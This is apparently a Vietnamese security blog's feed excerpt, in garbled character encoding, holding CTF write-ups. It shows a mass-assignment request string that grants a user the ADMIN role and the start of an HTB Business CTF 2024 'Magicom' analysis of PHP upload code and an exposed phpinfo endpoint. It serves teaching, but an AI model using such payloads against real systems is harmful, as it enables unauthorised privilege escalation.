&lt;/div&gt;&lt;p&gt;LÃºc nÃ y, mÃ¬nh sáº½ cÃ³ thá»ƒ truyá»n vÃ o 1 hÃ ng má»›i user cá»§a mÃ¬nh báº±ng cÃ¡ch sau:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;roles[0].roleID.=1&amp;amp;roles[0].userID=1&amp;amp;roles[0].name=ADMIN
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src="https://hackmd.io/_uploads/rJ62OlAKC.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Trong db ta cÃ³ ngÆ°á»i dÃ¹ng Ä‘Ã³ vá»›i userID 18:
&lt;img src="https://hackmd.io/_uploads/SJX3OxAFC.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Táº¡i báº£ng roles thÃ¬ ta cÃ³ 2 hÃ ng Ä‘á»ƒ chá»©a role cá»§a user kev1n-3 lÃ  CUSTOMER vÃ  ADMIN:
&lt;img src="https://hackmd.io/_uploads/BkUeKlRt0.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Sá»‘ cá»§a roleID vÃ  userID truyá»n vÃ o khÃ´ng quan trá»ng, mÃ¬nh cÃ³ thá»ƒ truyá»n gÃ¬ cÅ©ng Ä‘Æ°á»£c nhÆ°ng báº¯t buá»™c cáº§n truyá»n giÃ¡ trá»‹ vÃ o, vÃ¬ 2 biáº¿n nÃ y sáº½ Ä‘Æ°á»£c gen ra tÆ°Æ¡ng á»©ng trong báº£ng khi khá»Ÿi táº¡o user vÃ  khá»Ÿi táº¡o Ä‘á»‘i tÆ°á»£ng Role báº±ng userID. Theo nhÆ° mÃ¬nh hiá»ƒu lÃ  sau khi nÃ³ save Ä‘á»‘i tÆ°á»£ng user thÃ¬ row role ADMIN sáº½ Ä‘Æ°á»£c save, sau Ä‘Ã³ role CUSTOMER Ä‘Æ°á»£c save sau Ä‘Ã³ táº¡i cÃ¢u lá»‡nh bÃªn dÆ°á»›i.&lt;/p&gt;</description></item><item><title>HTB Business CTF 2024 Write Up - Magicom</title><link>https://kev1n1203.github.io/p/htb-business-2024/</link><pubDate>Sat, 25 May 2024 21:42:04 +0000</pubDate><guid>https://kev1n1203.github.io/p/htb-business-2024/</guid><description>&lt;p&gt;Trong giáº£i HTB Business nÃ y, mÃ¬nh tham gia vÃ o lÃ m challenge Omniwatch vÃ  Magicom cÃ¹ng vá»›i cÃ¡c teammates trong cÃ¢u láº¡c bá»™. ChÃºng mÃ¬nh Ä‘Ã£ solve Ä‘Æ°á»£c challenge Omniwatch, cÃ²n Magicom thÃ¬ gáº§n nhÆ° Ä‘Ã£ lÃ m Ä‘Æ°á»£c, chá»‰ thiáº¿u má»™t bÆ°á»›c ná»¯a nhÆ°ng chÃºng mÃ¬nh Ä‘Ã£ Ä‘i sai hÆ°á»›ng vÃ  khÃ´ng tÃ¬m ra cÃ¡ch giáº£i ká»‹p giá» nÃªn khÃ´ng ká»‹p solve.
MÃ¬nh muá»‘n viáº¿t lÃ  Ä‘á»ƒ chia sáº» láº¡i quÃ¡ trÃ¬nh giáº£i challenge cá»§a mÃ¬nh vÃ  cÃ¡c teammates, vÃ  cÅ©ng nhÆ° lÃ  hÆ°á»›ng giáº£i Ä‘Ãºng Ä‘áº¯n Ä‘á»ƒ solve challenge. MÃ¬nh Ä‘Ã£ tham kháº£o official solution vÃ  nháº­n ra anh em Ä‘Ã£ Ä‘i Ä‘Ãºng gáº§n háº¿t cÃ¡c bÆ°á»›c, chá»‰ cÃ³ bÆ°á»›c Ä‘áº§u lÃ  chÆ°a ra, nÃªn bÆ°á»›c Ä‘áº§u cá»§a mÃ¬nh sáº½ Ä‘i theo con Ä‘Æ°á»ng cá»§a official write up. MÃ¬nh sáº½ tiáº¿n hÃ nh vÃ o khai thÃ¡c táº¡i local vÃ¬ mÃ¬nh viáº¿t write up nÃ y hÆ¡i muá»™n nÃªn khÃ´ng deploy trÃªn server ká»‹p=))&lt;/p&gt;
&lt;h2 id="preface"&gt;Preface
&lt;/h2&gt;&lt;p&gt;Challenge xuáº¥t hiá»‡n dÆ°á»›i dáº¡ng má»™t website cÃ³ chá»©c nÄƒng xem sáº£n pháº©m vÃ  thÃªm sáº£n pháº©m, ngÆ°á»i dÃ¹ng cÃ³ thá»ƒ thÃªm sáº£n pháº©m vÃ  má»™t sá»‘ cÃ¡c thÃ´ng tin cá»§a sáº£n pháº©m, trong Ä‘Ã³ lÃ  pháº§n áº£nh minh há»a:
&lt;img src="https://hackmd.io/_uploads/BkhzXty40.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
ÄÃ£ Ä‘Æ°á»£c add product tÃ¹y theo Ã½ mÃ¬nh mÃ  cÃ²n unauthen, mÃ¬nh ban Ä‘áº§u cÅ©ng nghÄ© upload php Ä‘á»ƒ RCE:
&lt;img src="https://hackmd.io/_uploads/Sya5yqJN0.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;&lt;/p&gt;
&lt;h2 id="phÃ¢n-tÃ­ch-source-code"&gt;PhÃ¢n TÃ­ch Source Code
&lt;/h2&gt;&lt;h3 id="config"&gt;Config
&lt;/h3&gt;&lt;p&gt;Ngay sau khi mÃ¬nh má»Ÿ source cá»§a challenge mÃ¬nh Ä‘Ã£ tháº¥y Ä‘Ã¢y cháº¯c cháº¯n khÃ´ng pháº£i lÃ  má»™t challenge upload file PHP thÃ´ng thÆ°á»ng. VÃ¬ challenge cung cáº¥p cáº£ phpinfo táº¡i /info, vÃ  file php.ini, mÃ¬nh nhÃ¬n sÆ¡ qua qua thÃ¬ cÅ©ng chÆ°a cÃ³ gÃ¬ báº¥t thÆ°á»ng, nhÆ°ng cháº¯c cháº¯n lÃ  mÃ¬nh cáº§n pháº£i dÃ¹ng Ä‘áº¿n chÃºng.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;span class="lnt"&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;$router-&amp;gt;get(&amp;#39;/info&amp;#39;, function(){
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; return phpinfo();
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;});
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src="https://hackmd.io/_uploads/S1fCHcy4R.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;&lt;/p&gt;
&lt;h3 id="source-code"&gt;Source Code
&lt;/h3&gt;&lt;p&gt;Challenge Ä‘Ã£ quy Ä‘á»‹nh nhá»¯ng route cÃ³ thá»ƒ truy cáº­p táº¡i website trong index.php:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;$router = new Router;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;$router-&amp;gt;get(&amp;#39;/&amp;#39;, &amp;#39;HomeController@index&amp;#39;);
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;$router-&amp;gt;get(&amp;#39;/home&amp;#39;, &amp;#39;HomeController@index&amp;#39;);
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;$router-&amp;gt;get(&amp;#39;/product&amp;#39;, &amp;#39;ProductViewController@index&amp;#39;);
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;$router-&amp;gt;get(&amp;#39;/addProduct&amp;#39;, &amp;#39;AddProductController@index&amp;#39;);
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;$router-&amp;gt;post(&amp;#39;/addProduct&amp;#39;, &amp;#39;AddProductController@add&amp;#39;);
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;$router-&amp;gt;get(&amp;#39;/info&amp;#39;, function(){
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; return phpinfo();
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;});
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;MÃ¬nh ngay láº­p tá»©c Ä‘i tÃ¬m kiáº¿m nhá»¯ng Ä‘oáº¡n code xá»­ lÃ½ upload file:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;models/ImageModel.php&lt;/li&gt;
&lt;/ol&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;span class="lnt"&gt;14
&lt;/span&gt;&lt;span class="lnt"&gt;15
&lt;/span&gt;&lt;span class="lnt"&gt;16
&lt;/span&gt;&lt;span class="lnt"&gt;17
&lt;/span&gt;&lt;span class="lnt"&gt;18
&lt;/span&gt;&lt;span class="lnt"&gt;19
&lt;/span&gt;&lt;span class="lnt"&gt;20
&lt;/span&gt;&lt;span class="lnt"&gt;21
&lt;/span&gt;&lt;span class="lnt"&gt;22
&lt;/span&gt;&lt;span class="lnt"&gt;23
&lt;/span&gt;&lt;span class="lnt"&gt;24
&lt;/span&gt;&lt;span class="lnt"&gt;25
&lt;/span&gt;&lt;span class="lnt"&gt;26
&lt;/span&gt;&lt;span class="lnt"&gt;27
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-gdscript3" data-lang="gdscript3"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="n"&gt;ImageModel&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;public&lt;/span&gt; &lt;span class="n"&gt;function&lt;/span&gt; &lt;span class="n"&gt;__construct&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;file&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;this&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;file&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;file&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;public&lt;/span&gt; &lt;span class="n"&gt;function&lt;/span&gt; &lt;span class="n"&gt;isValid&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;allowed_extensions&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;jpeg&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;jpg&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;png&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;file_extension&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;pathinfo&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;this&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;file&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;name&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;PATHINFO_EXTENSION&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;print_r&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;this&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;file&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="n"&gt;in_array&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;file_extension&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;allowed_extensions&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;false&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;allowed_mime_types&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;image/jpeg&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;image/jpg&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;image/png&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;mime_type&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;mime_content_type&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;this&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;file&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;tmp_name&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="n"&gt;in_array&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;mime_type&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;allowed_mime_types&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;false&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="n"&gt;getimagesize&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;this&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;file&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;tmp_name&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;false&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;true&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;Class nÃ y Ä‘Æ°á»£c gá»i trong request xá»­ lÃ½ file nÃªn mÃ¬nh muá»‘n nÃ³i vá» nÃ³ trÆ°á»›c. QuÃ¡ trÃ¬nh kiá»ƒm duyá»‡t file Ä‘Æ°á»£c gÃ³i gá»n trong hÃ m isValid()&lt;/li&gt;
&lt;li&gt;File extension Ä‘Æ°á»£c láº¥y báº±ng PATHINFO_EXTENSION vÃ  Ä‘Æ°á»£c whitelist =&amp;gt; loáº¡i bá» kháº£ nÄƒng bypass upload file php bypass báº±ng extension file&lt;/li&gt;
&lt;li&gt;Sá»­ dá»¥ng print_r Ä‘á»ƒ in ra máº£ng thÃ´ng tin cá»§a file Ä‘Ã³ theo dáº¡ng &lt;code&gt;[key] =&amp;gt; value&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Sau khi check extension class tiáº¿p tá»¥c check mime types báº±ng cÃ¡ch whitelist, vÃ  cuá»‘i cÃ¹ng lÃ  check size báº±ng getimagesize. MÃ¬nh gáº§n nhÆ° khÃ´ng tháº¥y cÆ¡ há»™i nÃ o Ä‘á»ƒ upload file PHP mÃ  RCE Ä‘Æ°á»£c, nhÆ°ng Ä‘oáº¡n print_r thÃ´ng tin khÃ¡ thÃº vá»‹, vÃ¬ nÃ³ chá»©a giÃ¡ trá»‹ &lt;code&gt;tmp_name&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start="2"&gt;
&lt;li&gt;controllers/AddProductController.php&lt;/li&gt;
&lt;/ol&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;span class="lnt"&gt;14
&lt;/span&gt;&lt;span class="lnt"&gt;15
&lt;/span&gt;&lt;span class="lnt"&gt;16
&lt;/span&gt;&lt;span class="lnt"&gt;17
&lt;/span&gt;&lt;span class="lnt"&gt;18
&lt;/span&gt;&lt;span class="lnt"&gt;19
&lt;/span&gt;&lt;span class="lnt"&gt;20
&lt;/span&gt;&lt;span class="lnt"&gt;21
&lt;/span&gt;&lt;span class="lnt"&gt;22
&lt;/span&gt;&lt;span class="lnt"&gt;23
&lt;/span&gt;&lt;span class="lnt"&gt;24
&lt;/span&gt;&lt;span class="lnt"&gt;25
&lt;/span&gt;&lt;span class="lnt"&gt;26
&lt;/span&gt;&lt;span class="lnt"&gt;27
&lt;/span&gt;&lt;span class="lnt"&gt;28
&lt;/span&gt;&lt;span class="lnt"&gt;29
&lt;/span&gt;&lt;span class="lnt"&gt;30
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-gdscript3" data-lang="gdscript3"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;public&lt;/span&gt; &lt;span class="n"&gt;function&lt;/span&gt; &lt;span class="n"&gt;add&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;empty&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;_FILES&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;image&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="n"&gt;empty&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;title&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="n"&gt;empty&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;description&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;header&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Location: /addProduct?error=1&amp;amp;message=Fields can&lt;/span&gt;&lt;span class="se"&gt;\&amp;#39;&lt;/span&gt;&lt;span class="s1"&gt;t be empty.&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;title&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;title&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;description&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;description&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
